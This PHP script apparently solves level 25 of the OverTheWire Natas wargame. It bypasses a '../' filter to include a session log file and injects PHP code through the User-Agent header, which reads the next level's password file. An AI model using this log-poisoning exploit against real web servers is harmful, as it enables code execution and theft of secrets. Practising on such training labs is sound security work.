<?php
require_once dirname(__DIR__) . '/bootstrap.php';

$level = 25;
$username = 'natas' . $level;
$password = readFlag($level - 1);
$url = sprintf('http://%s.natas.labs.overthewire.org/', $username);

//get sessionId
$response = $client->request('GET', $url, [
    'auth' => [$username, $password],
]);
$cookies = $client->getConfig('cookies');
$sessionId = $cookies->toArray()[0]['Value'];

//exploid
$response = $client->request('GET', $url, [
    'auth' => [$username, $password],
    'query' => ['lang' => "..././logs/natas25_" . $sessionId . ".log"], //str_replace("../","",'..././') => ../
    'headers' => [
        'User-Agent' => 'Password: <?= file_get_contents(\'/etc/natas_webpass/natas26\');?>'
    ],
]);

$body = (string)$response->getBody();
preg_match('/Password: (.*)/', $body, $flag);
echo $flag[1];
